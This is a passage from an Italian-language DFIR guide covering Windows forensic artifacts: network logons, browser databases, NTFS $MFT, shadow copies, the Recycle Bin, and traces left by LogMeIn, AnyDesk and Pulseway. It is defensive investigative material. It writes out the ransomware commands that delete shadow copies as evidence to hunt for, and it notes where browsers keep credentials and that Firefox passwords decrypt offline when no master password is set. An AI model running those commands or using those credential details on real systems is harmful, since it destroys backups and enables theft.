5. Confrontare le date di esecuzione e di creazione del file con la timeline dell'incidente.

**Web e file:** ridurre gli URL ai domini, deduplicarli e controllarne la reputazione (per esempio contro elenchi di phishing come OpenPhish, o con WHOIS). Per i file servono il ruolo dell'utente e il contenuto delle condivisioni: la vera difficoltà è capire cosa è normale per quel computer e quell'utente.

In Cyber Triage la sezione Program Run normalizza i vari artefatti e assegna un punteggio (Bad, Suspicious, Good, Unknown) in base a percorso, firma, Reversing Labs, regole YARA ed elenchi di permessi e divieti; la sezione Web raggruppa per dominio (filtro predefinito: ultimi 2 mesi). Esempio della guida: un file segnalato come malware, con voci Prefetch e UserAssist, dopo la cui esecuzione compaiono archivi ZIP cifrati.

*Fonte:* [Intro to IR Triage (Part 5): User Activity](https://www.cybertriage.com/blog/training/intro-to-ir-triage-part-5-user-activity/), Cyber Triage (Brian Carrier), 6 agosto 2019, aggiornata 20 gennaio 2026.

### 3.4 Network logon sospetti

Un network logon (evento 4624 con tipo 3) è l'accesso più rapido e più comune tra macchine: da solo dice poco su cosa è successo dopo, quindi va seguito all'indietro fino all'host di origine e in avanti nella timeline.

- **Quando nasce:** è l'applicazione che autentica l'utente a decidere il tipo di sessione. Esempi: accesso a condivisioni SMB, WinRM e PowerShell Remoting, Desktop remoto con Network Level Authentication, strumenti remoti come TeamViewer prima del loro login.
- **Campi dell'evento 4624 da guardare:** account, ora, IP remoto, processo che ha chiesto l'autenticazione, metodo di autenticazione.

**1. Confermare che è malevolo**

- L'account è di un dipendente con un motivo per accedere a quel sistema?
- Ha già effettuato accessi a questo sistema, e da dove? (dipende da quanto log è conservato)
- Cosa fa l'account sugli altri sistemi? (log dei domain controller, SIEM, EDR)

**2. Guardare indietro:** se è malevolo, l'account è compromesso (va disattivato e indagato) e l'attaccante era attivo sull'host di origine. Quell'host entra nel perimetro: va raccolto e se ne esamina la timeline all'ora dell'accesso, perché può portare ad altri sistemi compromessi.

**3. Guardare avanti:** l'impatto dipende dall'applicazione che ha generato l'accesso (SMB: file copiati; PowerShell: processi creati).

- Il nome del processo nell'evento indica l'applicazione.
- Nella timeline unificata: eventi Terminal Services subito dopo indicano RDP con NLA; file creati subito dopo indicano un trasferimento; `whoami` e `cmd` indicano una shell interattiva.
- Rivedere tutta l'attività dell'account sospetto: un account non autorizzato ha poca attività, quindi le anomalie si vedono bene.

**Esempio della guida:** l'account `gdoe` è nuovo sul sistema (ultimi 30 giorni), accede solo da remoto e solo tra le 6 e le 12. Dopo l'accesso compaiono il file `/windows/support.service.exe` e i comandi `whoami` e `cmd`, gli unici due processi associati all'account.

**Limite:** gli scenari che generano network logon sono molti, e alcune applicazioni nascondono volutamente di esserne la fonte.

*Fonte:* [DFIR Next Steps: What to Do After You Find a Suspicious Windows Network Logon Session](https://www.cybertriage.com/dfir-next-steps/dfir-next-steps-what-to-do-after-you-find-a-suspicious-windows-network-logon-session/), Cyber Triage (Brian Carrier), 15 marzo 2024, aggiornata 25 maggio 2026.

### 3.5 Artefatti dei browser

Chrome, Edge, Brave e Opera condividono la stessa struttura Chromium, quindi un solo parser copre quasi tutti i casi; la trappola principale sono i timestamp, con un'epoca diversa per ogni famiglia di browser.

**Profili su Windows**

| Browser | Cartella del profilo |
| --- | --- |
| Chrome | `%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\` |
| Edge | `%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\` |
| Brave | `%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\` |
| Opera | `%APPDATA%\Opera Software\Opera Stable\` |
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles\<casuale>.default-release\` |

`Default` è il primo profilo; `Profile 1`, `Profile 2` e così via sono gli altri, ognuno con i propri database: vanno analizzati tutti.

**Database Chromium (SQLite)**

| File | Tabelle principali | Cosa prova |
| --- | --- | --- |
| `History` | `urls`, `visits`, `visit_source`, `downloads`, `downloads_url_chains`, `keyword_search_terms`, `segments` | Siti visitati, ricerche digitate nella barra, download con percorso di destinazione e referrer |
| `Cookies` | `cookies` | Sessioni autenticate e identificativi persistenti |
| `Login Data` | `logins` | Credenziali salvate (password cifrate con DPAPI, legate all'utente Windows) |
| `Web Data` | `autofill`, `autofill_profiles`, `credit_cards`, `keywords` | Nomi, indirizzi, telefoni e carte parziali proposti dall'autocompletamento |
| `Top Sites` | `top_sites` | Siti più visitati |
| `Network Action Predictor` | `network_action_predictor` | Testo digitato nella barra che ha attivato un suggerimento, anche senza premere Invio |

Oltre ai database: la **cache** conserva le risposte HTTP (per esempio la pagina di phishing vista dalla vittima); **Local Storage** e **IndexedDB** sono archivi LevelDB per origine, dove stanno anche i token di sessione di WhatsApp Web e Telegram Web; la cartella **Sessions** (`Current Tabs`, `Current Session`, `Last Tabs`, `Last Session`) dice cosa era aperto alla chiusura del browser.

**Firefox:** `places.sqlite` (`moz_places`, `moz_historyvisits`, `moz_bookmarks`), `cookies.sqlite`, `formhistory.sqlite`, `key4.db` + `logins.json` (credenziali: senza password principale si decifrano offline), `sessionstore.jsonlz4` (sessione compressa in formato mozLz4, intestazione `mozLz40`, che i normali strumenti lz4 rifiutano).

**Timestamp**

| Famiglia | Epoca | Unità | Conversione in secondi Unix |
| --- | --- | --- | --- |
| Chromium (WebKit) | 1° gennaio 1601 UTC | Microsecondi | valore / 1.000.000 − 11.644.473.600 |
| Firefox (PRTime) | 1° gennaio 1970 UTC | Microsecondi | valore / 1.000.000 |
| Safari (Cocoa, solo macOS) | 1° gennaio 2001 UTC | Secondi | valore + 978.307.200 |

**Navigazione in incognito:** riduce le tracce nel profilo, non quelle nel sistema. Restano la cache DNS (`ipconfig /displaydns` su sistema acceso), `pagefile.sys` e `hiberfil.sys`, la memoria, MUICache e UserAssist (avvio del browser), il Prefetch, gli eventi di creazione dei processi, la telemetria EDR, i log di proxy e provider.

**Acquisizione e analisi**

1. Copiare il profilo a browser chiuso insieme ai file `-wal`, `-journal` e `-shm`, altrimenti si perde l'attività recente; calcolare lo SHA-256 di ogni file.
2. Se servono sessioni attive, cache LevelDB e Sessions, acquisire il profilo dal sistema acceso prima di spegnerlo.
3. Leggere prima `History`, poi `Cookies`, quindi cache, LevelDB e Sessions.
4. Lavorare su una copia e verificare i risultati con un secondo strumento.

**Strumenti:** Hindsight (Ryan Benson; converte i timestamp in UTC), DB Browser for SQLite (non li converte), NirSoft ChromeCacheView e BrowsingHistoryView, Magnet AXIOM. La guida è scritta per il contesto indiano e include una parte sui certificati di ammissibilità previsti dalla legge indiana (Sezione 63 del Bharatiya Sakshya Adhiniyam), qui non riportata.

*Fonte:* [Web Browser Forensics: Cookies, Cache, History and Session Recovery](https://forensicspot.com/topics/digital-forensics/web-browser-forensics-cookies-cache-history-sessions), ForensicSpot (Sourabh, revisione di Sushil Kumar), 18 maggio 2026, aggiornata 21 settembre 2026.

## 4. Artefatti del file system

Il file system NTFS e le funzioni di Windows costruite sopra di esso (copie shadow, Cestino) conservano metadati e versioni precedenti dei file anche dopo cancellazioni e pulizie.

### 4.1 `$MFT` e metadati NTFS

La `$MFT` (Master File Table) contiene un record per ogni file e cartella del volume: analizzarla da sola è veloce e utile per il triage, ma non tutto il file system sta lì dentro.

**Struttura di un record**

- Record di dimensione fissa, di solito 1024 byte (il valore è indicato nell'header del volume).
- Firma `FILE` nei primi 4 byte; record vuoti riempiti di zeri; `BAAD` indica un record danneggiato.
- Header: flag di allocazione (in uso o cancellato), file reference (numero del record + numero di sequenza), riferimento al record base (per i record di estensione), numero di sequenza del journal, numero di attributi.
- Per leggerlo: determinare la dimensione dei record, controllare la firma, applicare i valori di fix-up (update sequence), estrarre gli attributi con nomi e timestamp, ricostruire i percorsi. Il modo di applicare i fix-up cambia tra versioni di NTFS: un dettaglio che conta quando si sceglie o si valuta un parser.

| Attributo | Tipo | Contenuto |
| --- | --- | --- |
| `$STANDARD_INFORMATION` | 0x10 | 4 timestamp (creazione, modifica, accesso, modifica del record), owner, security ID, USN, flag |
| `$ATTRIBUTE_LIST` | 0x20 | Rimandi ad attributi sparsi su più record; i suoi dati possono stare fuori dalla `$MFT` |
| `$FILE_NAME` | 0x30 | Riferimento alla cartella padre, 4 timestamp, flag, nome; più istanze per gli hard link o per nome DOS 8.3 + nome lungo |
| `$DATA` | 0x80 | Contenuto: residente (dentro il record, per i file piccoli) o non residente (in cluster esterni) |
| Indice `$I30` | — | Contenuto delle cartelle, fuori dalla `$MFT` |

**Vantaggio:** la `$MFT` pesa qualche gigabyte contro le decine o centinaia di un volume: permette il triage rapido di molti sistemi.

**Limiti dell'analisi della sola `$MFT`**

- Mancano gli indici `$I30`, i dati delle attribute list, il `$UsnJrnl:$J` e gli altri file di metadati.
- Non tutti i parser gestiscono le attribute list: alcuni ignorano i `$FILE_NAME` nei record di estensione.
- Percorsi: si risale di padre in padre verificando allocazione e numero di sequenza; se non coincidono il file è «orfano». Il numero di sequenza cresce di 1 a ogni cancellazione.
- Hard link: più `$FILE_NAME` con padri diversi, un solo `$STANDARD_INFORMATION` valido per tutti.
- Nomi DOS: servono per capire se `C:\PROGRA~1` è Program Files o ProgramData, ma molti strumenti li scartano.
- Cartelle rinominate: se `\somedir\somefile.txt` viene cancellato e in seguito `\somedir` diventa `\newdir`, la `$MFT` da sola suggerisce il percorso sbagliato `\newdir\somefile.txt`. Il `$UsnJrnl` (motivi `FILE_DELETE`, `RENAME_OLD_NAME`, `RENAME_NEW_NAME`) ricostruisce la sequenza corretta.
- Reparse point e junction: la `$MFT` ne mostra i metadati, non lo stato sul sistema acceso.

Per fare prove: il progetto `ntfs-specimens` (dfirlabs) offre immagini che testano attribute list e rinomine. Per il formato completo l'articolo rimanda alla documentazione di libfsntfs (libyal).

**Nota integrativa (non nell'articolo):** confrontare i timestamp di `$STANDARD_INFORMATION`, modificabili con le normali API e quindi soggetti a timestomping, con quelli di `$FILE_NAME` è la tecnica classica per scoprire date falsificate; tra gli strumenti più usati per analizzare la `$MFT` c'è MFTECmd di Eric Zimmerman.

*Fonte:* [Parsing the $MFT NTFS metadata file](https://osdfir.blogspot.com/2020/04/parsing-mft-ntfs-metadata-file.html), Open Source DFIR (Joachim Metz), 30 aprile 2020.

### 4.2 Volume Shadow Copies

Le copie shadow sono istantanee del volume che Windows crea in background: spesso contengono i file, i log e gli hive che l'attaccante ha poi cancellato.

- **Cosa sono:** snapshot di un volume a un certo istante, gestiti dal servizio Volume Shadow Copy (VSS), presenti da Windows XP con i punti di ripristino. Da Vista e Server 2008 coprono quasi tutto il volume: eseguibili, DLL, driver, registro, event log.
- **Come funzionano:** copy-on-write. Prima che un blocco venga sovrascritto, Windows ne salva la versione precedente; i blocchi da 16 KB finiscono in `System Volume Information`, indicizzati da un file catalogo con nome GUID.
- **Il limite di Windows 8 e successivi (ScopeSnapshots):** sui client le copie includono di default solo i file rilevanti per il ripristino del sistema, quindi file sul desktop e cartelle qualsiasi possono mancare. I server fanno ancora copie complete, e ScopeSnapshots si può disattivare dal registro. La chiave `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` elenca i file esclusi; `pagefile.sys` e `hiberfil.sys` di solito lo sono.

**Come accedervi**

- Elenco (sistema acceso, prompt da amministratore): `vssadmin list shadows /for=C:`, con la data di creazione di ogni copia, fondamentale per la timeline.
- Sistema acceso: un collegamento simbolico rende la copia navigabile come una cartella, per esempio `mklink /d C:\vss1 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\` (con la barra finale).
- Immagini disco:
  - **Arsenal Image Mounter** presenta l'immagine a Windows come un disco SCSI, e Windows ne espone le copie shadow (il mount di FTK Imager non lo fa);
  - **libvshadow** di Joachim Metz: `vshadowinfo` elenca le copie, `vshadowmount` le espone come immagini raw da analizzare;
  - **KAPE**, a cui l'autore dedica un articolo a parte.
- Timeline: `log2timeline.py` (Plaso) sa includere le copie shadow; `psort` elimina gli eventi duplicati tra una copia e l'altra.

**Cosa si recupera:** eseguibili e malware cancellati, file di configurazione, event log cancellati, stati precedenti del registro, documenti e comunicazioni.

**Perché spesso sopravvivono:** l'attaccante non le conosce, non ha tempo di eliminarle, oppure per farlo deve usare strumenti amministrativi che lasciano tracce proprie.

**Nota integrativa:** i comandi con cui i ransomware le cancellano (`vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete`; MITRE T1490) sono a loro volta prove di esecuzione da cercare con gli artefatti della sezione 1.

*Fonte:* [Volume Shadow Copies: The Hidden Evidence Goldmine You Need to Know About](https://medium.com/@cyberengage.org/volume-shadow-copies-the-hidden-evidence-goldmine-you-need-to-know-about-f97ee917e78f), CyberEngage (Dean), 23 marzo 2024, aggiornata 22 febbraio 2026 (letto nella versione pubblicata su [cyberengage.org](https://www.cyberengage.org/post/extracting-examine-volume-shadow-copies-for-forensic-analysis)).

### 4.3 Cestino (`$Recycle.Bin`)

Ogni file mandato nel Cestino genera una coppia `$I`/`$R`: il `$I` dice chi l'ha cancellato, da dove e quando, il `$R` ne conserva il contenuto.

- **Dove:** ogni volume NTFS ha la sua cartella nascosta `$Recycle.Bin`, con una sottocartella per ogni SID (`C:\$Recycle.Bin\<SID>\`, `D:\$Recycle.Bin\<SID>\` e così via): analizzare solo il volume di sistema porta a conclusioni sbagliate. Sistemi vecchi: `C:\Recycled` (95, 98, ME) e `C:\Recycler\<SID>` con il file `INFO2` (NT, 2000, XP).
- **La coppia:** `$R<token>.<estensione>` è il contenuto (un file o un'intera cartella), `$I<token>.<estensione>` sono i metadati; a legarli è il token casuale, non l'estensione.
- **Contenuto del `$I`:** percorso originale completo, dimensione originale, data di cancellazione (FILETIME in UTC). Da Vista a Windows 8 è un record fisso di 544 byte; da Windows 10 ha lunghezza variabile, con un campo per la lunghezza del nome: i parser vecchi possono troncare i percorsi.

**Come leggere le date**

- La data nel `$I` è l'ora in cui l'elemento è stato mandato nel Cestino.
- Il `$R` conserva le date del file originale, perché è uno spostamento con rinomina nello stesso volume (cambia solo l'ora di modifica del record MFT): un `$R` creato mesi fa accanto a un `$I` di ieri è normale.

**Cosa lo aggira o lo svuota**

- Shift+Canc, riga di comando, API, condivisioni di rete e molti supporti rimovibili cancellano senza passare dal Cestino.
- File più grandi della quota: Windows chiede se eliminarli definitivamente.
- Ripristino: il contenuto torna al suo posto e `$I` e `$R` spariscono (restano tracce nella MFT e nel USN journal).
- Svuotamento: `$I` e `$R` vengono cancellati (eventi FileDelete nel USN journal) e possono sopravvivere nello spazio non allocato.
- Quota piena: Windows elimina da solo gli elementi più vecchi, quindi il Cestino mostra soprattutto le cancellazioni recenti.
- Impostazioni per volume in `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\BitBucket\Volume\{GUID}`: `MaxCapacity` (quota), `NukeOnDelete` = 1 (cancellazione diretta, senza Cestino), `Percent` (versioni vecchie).

**Cosa prova e cosa no**

- Prova che un certo contesto utente (SID) ha mandato un certo elemento nel Cestino, da un certo percorso, a una certa ora, su un certo volume.
- Non prova l'intenzione, la distruzione definitiva, né che non ci siano state altre cancellazioni.
- Il SID è di chi ha cancellato, non del proprietario del file: un amministratore che cancella file nel profilo di un altro utente li trova nel proprio Cestino. Il SID si traduce in nome utente dal SAM o con Registry Explorer.

**Stati parziali**

- `$I` senza `$R`: svuotamento parziale, espulsione per quota, sovrascrittura, recupero da copie shadow o carving; il `$I` resta utile per timeline e percorso.
- `$R` senza `$I`: raro; rimozione selettiva, corruzione o limiti del parser (verificare lo strumento prima di parlare di anti-forensics).
- Cestino vuoto non significa «nessuna cancellazione»: controllare le copie shadow, fare carving dei `$I` nello spazio non allocato, guardare il USN journal e l'esecuzione di strumenti di pulizia.

**Corroborare con:** MFT e indici `$I30` (cambio di cartella padre e nome in `$R…`), USN journal in `\$Extend\$UsnJrnl:$J` (raffiche di rinomine = cancellazione in blocco), copie shadow (da Windows 8 conservano solo una parte dei dati), Jump Lists e altri artefatti di accesso ai file.

**Strumenti:** KAPE (target `RecycleBin_InfoFiles` e `RecycleBin_DataFiles`) e RBCmd di Eric Zimmerman (`RBCmd.exe -d <cartella> --csv <output>`).

**Anti-forensics:** svuotare il Cestino è comune e quasi sempre innocuo. Sono segnali più forti gli strumenti di cancellazione sicura sul Cestino, l'eliminazione delle copie shadow, schemi di wiping nello spazio libero e la pulizia coordinata di log e altri artefatti.

*Fonte:* [Windows Recycle Bin Forensics: `$I`/`$R` Files and Deleted File Metadata](https://sethenoka.com/windows-recycle-bin-forensics-on-windows-10-and-11/), Seth Enoka.

## 5. Artefatti RMM

Gli strumenti di gestione remota (RMM) sono legittimi, quindi sfuggono alle regole di rilevamento, e gli attaccanti li usano per accesso e persistenza. La prima scheda dà il metodo generale, le altre quattro il dettaglio di singoli prodotti.

### 5.1 Strumenti RMM sospetti: il metodo

Davanti a un RMM su un host compromesso le domande sono quattro: è malevolo? Ci sono stati accessi? Cosa è stato fatto? Come è arrivato?

- **Perché piacciono agli attaccanti:** sono strumenti legittimi (poche regole EDR e SIEM li segnalano); esistono versioni portabili a singolo eseguibile, avviabili senza privilegi; si collegano in uscita ai server del produttore, spesso sulla porta 443, come normale traffico web; sono tipici dei gruppi ransomware; arrivano presto nell'attacco e danno accesso e persistenza. Riferimenti citati: advisory CISA di gennaio 2023 e la Ransomware Tool Matrix di @BushidoToken.

**1. Confermare che è malevolo**

- Installato o portabile? Avviato da una sottocartella di Program Files e presente tra i programmi installati, oppure no. Le versioni portabili non richiedono diritti di amministratore.
- È presente su altri host? Chiedere a IT e utenti: spesso si risolve in pochi minuti una domanda che costerebbe ore di analisi.
- Le date dell'eseguibile e dei file collegati precedono di molto la finestra dell'incidente?

**2. Trovare gli accessi**

- Log testuali del prodotto (spesso in `%AppData%`), event log (più probabili con le installazioni complete), SRUM, cache DNS, log di IDS, proxy e firewall verso i server del produttore.
- L'RMM entra nel desktop dell'utente già connesso: di solito non c'è un evento di logon di Windows. Con le versioni portabili le prove di connessione valgono più di quelle di logon.

**3. Trovare l'attività malevola**

- Comportamenti anomali dell'utente durante la sessione: file insoliti, grandi archivi (esfiltrazione), strumenti di sicurezza, PowerShell, shell.
- Connessioni verso URL sospetti per scaricare strumenti o esfiltrare (cronologia del browser, cache DNS, proxy e firewall).
- Log dell'antivirus locale, spesso non inviati alla console centrale (Cyber Triage raccoglie quelli di Defender): l'RMM passa, gli strumenti caricati dopo spesso no.
- Ricognizione e scansioni: esecuzione di scanner di rete, tentativi di escalation, proxy inversi, raffiche di accessi falliti verso Active Directory, condivisioni e altre risorse.

**4. Accesso iniziale e perimetro**

- Data di creazione dell'eseguibile e della sua cartella, poi la timeline subito prima: di solito mostra come è arrivato.
- Privilegi dell'account compromesso (amministratore locale o di dominio) e quindi possibile movimento laterale.
- Altri host: autenticazioni partite da questo sistema, stessi file comparsi durante la sessione, stesso RMM, connessioni ai suoi server.

*Fonte:* [DFIR Next Steps: What to Do After You Find a Suspicious Use of Remote Monitoring and Management Tools](https://www.cybertriage.com/blog/dfir-next-steps-what-to-do-after-you-find-a-suspicious-use-of-remote-monitoring-management-tools/), Cyber Triage (Mike Wilkinson), 9 settembre 2024, aggiornata 4 gennaio 2026.

### 5.2 LogMeIn

LogMeIn (gruppo GoTo) ha tre prodotti con tracce diverse: il primo passo è capire quale è presente e se il computer controlla altri host o viene controllato.

| Prodotto | Uso previsto | Abuso tipico |
| --- | --- | --- |
| Rescue | Supporto remoto al volo (helpdesk, MSP): link o singolo eseguibile, trasferimento file, accesso non presidiato | Truffe del falso supporto tecnico; accesso non presidiato come backdoor |
| Pro | Accesso remoto persistente per singoli e piccoli team | Installazione come backdoor; account cloud compromessi |
| Central | Gestione di flotte: Pro più script, patch e monitoraggio | Backdoor su molti sistemi da un solo account compromesso |

**Eseguibili**

| Ruolo | File | Posizione e note |
| --- | --- | --- |
| Rescue, tecnico (controlla) | `LogMeInRescueTechnicianConsoleApp.msi`, che installa `LMIRTechConsole.exe`; `LMIGuardianSvc.exe` | `C:\Program Files (x86)\LogMeIn Rescue Technician Console\...`; in alternativa la console web `secure.logmeinrescue.com/webtc/` |
| Rescue, cliente (controllato) | `Support-LogMeInRescue.exe` | Scaricato (es. in `Downloads`), unico per sessione, avvia `LMI_Rescue.exe` e poi si chiude |
| Rescue, cliente | `LMI_Rescue.exe`, `LMI_Rescue_Srv.exe`, `LMI_RescueRC.exe` | `%LOCALAPPDATA%\LogMeIn Rescue Applet\LMIR<id>.tmp\`; con elevazione in `C:\Program Files (x86)\LogMeIn Rescue Applet\` |
| Rescue, accesso non presidiato | `Unattended.exe`, `Unattended_srv.exe` | `C:\Program Files (x86)\LogMeIn Rescue Unattended\<id>\` |
| Pro e Central, tecnico | `LogMeInClientApp.msi`, che installa `LMIIgnition.exe`; `LMIGuardianSvc.exe` | `C:\Program Files (x86)\LogMeIn Ignition`; console web `secure.logmein.com/central/Central.aspx` |
| Pro e Central, host controllato | `LogMeIn.msi`, che installa `LogMeIn.exe` (servizio «LogMeIn»), `LogMeInRC.exe` (connessioni in arrivo), `LogMeInSystray.exe`, `LogMeInToolkit.exe`, `LMIGuardianSvc.exe`, `RaMaint.exe` | `C:\Program Files (x86)\LogMeIn\x64` e `\x86` |

Le intestazioni PE riportano CompanyName «LogMeIn, Inc.».

**Domini:** `logmeinrescue.com` (anche `.eu` e `logmeinrescue-enterprise.com`) con `secure.` (login, console web, download, generatore di accesso non presidiato), `console.` (`/connect/<n>`, `/chat/<n>`) e l'infrastruttura `rsc-*`; i vecchi `logmein123.com` e `logmein123.eu` (inserimento del codice); `logmein.com` con `secure.logmein.com` (console Central, `LogMeInClientApp.msi`, `Logmein.msi`, `addacomputer3_msi.aspx`) e l'infrastruttura `lmi-*`.

**Event log**

| Prodotto | Log | Evento | Significato |
| --- | --- | --- | --- |
| Rescue | Security | 4624, 4625 | Processo `LMI_Rescue_Srv.exe` o `unattended_Srv.exe`, logon di tipo 2 senza host remoto, quando si inseriscono credenziali o si eleva a SYSTEM |
| Rescue | Application (MsiInstaller) | 1040, 1042, 1033 | Inizio e fine della transazione di installazione; esito per il prodotto «LogMeIn Rescue» |
| Rescue | System | 7045 | Servizi il cui nome inizia con «LogMeIn Rescue» (accesso non presidiato o elevazione) |
| Pro e Central | Security | 4624, 4625 | Processo `LogMeIn.exe`, logon di tipo 2 senza host remoto |
| Pro e Central | Application (fonte LogMeIn) | 104 | Accesso fallito, con IP pubblico |
| Pro e Central | Application (fonte LogMeIn) | 102, 105 | Logon e logoff, con IP pubblico e utente |
| Pro e Central | Application (fonte LogMeIn) | 202, 205 | Inizio e fine della sessione remota, con IP pubblico e utente |
| Pro e Central | System | 7045 | Servizi `LMIGuardianSvc`, `LogMeIn`, `LogMeIn Maintenance Service` (`RaMaint.exe`), `LogMeIn Kernel Information Provider` (`LMIInfo.sys`), `LogMeIn Remote File System Driver` (`LMIRfsDriver.sys`) |

**Registro e log testuali**

- Rescue, tecnico: `HKU\<SID>\Software\LogMeInRescue` (last write ≈ primo avvio); `HKLM\SOFTWARE\WOW6432Node\LogMeInRescue` (≈ installazione; viene rimossa con la disinstallazione).
- Rescue, cliente: `session.log` nella cartella della sessione, con inizio e fine; di solito viene cancellato insieme alla cartella dai `.bat` di pulizia.
- Pro e Central, tecnico: `HKLM\SOFTWARE\WOW6432Node\LogMeIn Ignition` (email degli account collegati, host remoti) e `HKU\<SID>\Software\LogMeIn Ignition` (≈ primo avvio); log `C:\ProgramData\LogMeIn\LogMeInBrowserPlugin.log` (utente, ora, host remoto; archivi `PluginAAAAMMGG.log`) e `%LOCALAPPDATA%\LogMeInIgnition\LogMeInIgnition.log` (account email).
- Pro e Central, host: `HKLM\SOFTWARE\LogMeIn`, `HKLM\SOFTWARE\LogMeIn, Inc.`, `HKU\<SID>\Software\LogMeIn`; log `C:\ProgramData\LogMeIn\LogMeIn.log` (archivi `LMIAAAAMMGG.log`).

**Le quattro domande**

1. Quale prodotto? (es. `LMIRTechConsole.exe` significa che questo computer controlla altri host)
2. L'organizzazione lo usa? Se no, è uno strumento non autorizzato da rimuovere: passare alla domanda 4.
3. È previsto su questo endpoint? Se sì e l'allarme riguardava solo la presenza, si può chiudere e regolare l'allarme.
4. L'attività è attesa? Da quanto tempo è presente, quali utenti sono coinvolti, connessioni in uscita e in entrata nuove o sospette, attività sospette prima e dopo.

*Fonte:* [DFIR Next Steps: Suspicious LogMeIn Use](https://www.cybertriage.com/blog/dfir-next-steps-suspicious-logmein-use/), Cyber Triage (Chris Ray, contenuti di Alex Detmering), 3 settembre 2025, aggiornata 17 dicembre 2025.

### 5.3 AnyDesk

AnyDesk è un unico eseguibile che fa da client, server e servizio, senza bisogno di account: facile da portare con sé, è amato da truffatori e gruppi ransomware, e i suoi file di testo registrano connessioni e trasferimenti.

- **Contesto:** AnyDesk Software GmbH; multipiattaforma; circa il 10% del mercato del supporto remoto (secondo dopo TeamViewer); portabile o installato come servizio; molto configurabile.
- **Eseguibile:** `AnyDesk.exe` o `AnyDesk*.exe`; installato in `C:\Program Files (x86)\AnyDesk`; i client personalizzati si chiamano `AnyDesk-ad_<id>` (es. `AnyDesk-ad_679ecc64`). Le copie rinominate si riconoscono dall'intestazione PE (ProductName «AnyDesk», CompanyName «AnyDesk Software GmbH»). Supporta anche la riga di comando.
- **Cartella dati:** versione portabile `C:\Users\*\AppData\Roaming\AnyDesk\` (client personalizzato: sottocartella `ad_*`); versione installata `%ProgramData%\AnyDesk\` (o `ad_*`). La data di creazione indica il primo avvio; quella della cartella di installazione indica l'installazione.

| File | Contenuto utile |
| --- | --- |
| `user.conf` | Impostazioni dell'utente, creato al primo avvio: percorsi di chat, registrazioni e screenshot; email dell'account (`ad.account.recent_logged_in_user`); ID già contattati (`ad.roster.items`, `ad.session.*`) |
| `system.conf` | ID e alias AnyDesk di questo computer (`ad.anynet.id`, `ad.anynet.alias`) |
| `connection_trace.txt` | Connessioni in entrata accettate o rifiutate e inviti in uscita: direzione, ora UTC, tipo (User, REJECTED, Password), alias e ID remoto. Non registra i tentativi di password falliti; REJECTED significa che l'utente ha rifiutato la richiesta |
| `file_transfer_trace.txt` | File inviati e ricevuti, su entrambi i computer; solo i nomi, senza percorsi |
| `ad.trace` / `ad_*.trace` | Log dettagliato non strutturato: IP remoti, ID, orari, trasferimenti. Stringhe utili: «Incoming session request» e «Sending a connection request for address» |

**Altre cartelle:** chat (un file per ID remoto, orari UTC, su entrambi i lati; posizione configurabile in `user.conf`); registrazioni delle sessioni in `C:\Users\*\Videos\AnyDesk` (il nome contiene direzione, ID e utenti, es. `Incoming User1 (ID)-User2 (ID) 0.anydesk`); registrazioni dello schermo in `...\Videos\AnyDesk\screen recordings`; screenshot in `C:\Users\*\Pictures\AnyDesk` (`anydesk00000.png`). La data di creazione di queste cartelle indica il primo uso da parte dell'utente.

**Rete:** `download.anydesk.com` (`AnyDesk.exe`; `AnyDesk-CM.exe` solo ricezione; `AnyDesk-SM.exe` solo controllo), `my.anydesk.com` (client personalizzati, con link pubblici o privati), relay `relay-*.net.anydesk.com`.

**Le quattro domande**

1. L'organizzazione usa AnyDesk? Se no, va rimosso: passare alla domanda 4.
2. È previsto su questo endpoint? Se no, stesso discorso.
3. Che configurazione? Installato (Program Files, dati in `%ProgramData%`, servizio) di solito è uso aziendale; portabile (Downloads, dati in `%AppData%`) è uso personale o supporto occasionale. Entrambi sullo stesso sistema: approfondire.
4. L'attività è attesa? Primo avvio (date delle cartelle dati); utenti coinvolti (cartella `%AppData%\AnyDesk` di ogni utente, `ad_*.trace`, eventi 4688 di `AnyDesk.exe`); connessioni in uscita e in entrata (`connection_trace.txt`, stringhe in `ad.trace`); timeline prima e dopo; trasferimenti di file (`file_transfer_trace.txt`).

*Fonte:* [DFIR Next Steps: Suspicious AnyDesk Use](https://www.cybertriage.com/blog/dfir-next-steps-suspicious-anydesk-use/), Cyber Triage (Chris Ray), 18 settembre 2025, aggiornata 11 dicembre 2025.

### 5.4 Pulseway

Con Pulseway un attaccante esegue comandi come SYSTEM senza lasciare traccia nei log di PowerShell: l'unica prova del testo dei comandi è il log dedicato `Pulseway-CommandAudit`.

- **Cos'è:** RMM SaaS basato su agente, pensato anche per la gestione da dispositivi mobili. Con diritti di amministratore l'agente si installa in modo silenzioso, senza avvisare l'utente. I log restano anche sui server Pulseway, un vantaggio per chi indaga.
- **Funzioni sfruttabili:** accesso remoto (console Pulseway o RDP), comandi CMD e PowerShell remoti, arresto di processi e servizi (anche EDR e antivirus), script di automazione (utili a distribuire ransomware), visualizzazione e copia di file, visualizzatore del registro, installazione di software, visione dello schermo senza avvisare l'utente.

| Elemento | Dettaglio |
| --- | --- |
| Cartella | `C:\Program Files\Pulseway` (101 file, 5 cartelle, 57 MB) |
| `PCMonitorManager.exe` | Interfaccia di gestione locale (richiede UAC) |
| `PCMonitorSrv.exe` | Agente principale, servizio «PC Monitor» |
| `PCMontask.exe`, `pcmonusertask.exe` | Agenti utente avviati dal servizio |
| Attività pianificata | `PulsewayServiceCheck`, giornaliera: un `.bat` verifica il servizio e lo riavvia se serve |
| Configurazione | `HKLM\SOFTWARE\MMSOFT Design\PC Monitor` e file XML `.config` accanto agli eseguibili |

**Log**

- Application log, evento **24001** per tutte le voci Pulseway. Cercare «Received Request»: `Start Remote Control` (connessione remota, con il GUID del dispositivo richiedente), `Get screens` (visione dello schermo), `Run command` e `Run PowerShell command` con il rimando `see <GUID> in Pulseway-CommandAudit log`.
- `%SystemRoot%\System32\winevt\Logs\Pulseway-CommandAudit.evtx`: il testo reale dei comandi, collegato tramite il GUID (es. `Arguments for <GUID>: 'netstat'`).
- I comandi PowerShell remoti girano come SYSTEM: non compaiono né nel log di PowerShell né nella cronologia della console, e i download fatti così non lasciano altri artefatti.

